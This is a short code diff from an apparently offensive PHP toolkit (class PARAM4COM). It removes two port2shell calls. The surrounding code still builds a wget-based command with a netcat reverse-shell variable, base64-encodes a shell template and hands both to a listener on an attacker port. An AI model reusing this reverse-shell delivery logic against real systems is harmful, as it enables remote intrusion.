@@ -73,7 +73,6 @@ class PARAM4COM extends URL{
                 $template_exec = str_replace("%CMD%",$cmd_rev_nc, $template_wget) ;
                 
                 $templateB64_shell = base64_encode($template_shell);
-                $this->port2shell($templateB64_shell);
                 
                 $this->service4lan($template_exec, $templateB64_shell, $attacker_port, 'T',"server");
             }
@@ -102,8 +101,7 @@ class PARAM4COM extends URL{
                 $template_exec = str_replace("%CMD%",$cmd_rev_nc, $template_wget) ;
 
                 $templateB64_shell = base64_encode($template_shell);
-                $this->port2shell($templateB64_shell);
-
+                
                 $this->service4lan($template_exec, $templateB64_shell, $attacker_port, 'T',"server");
             }
             $this->pause();
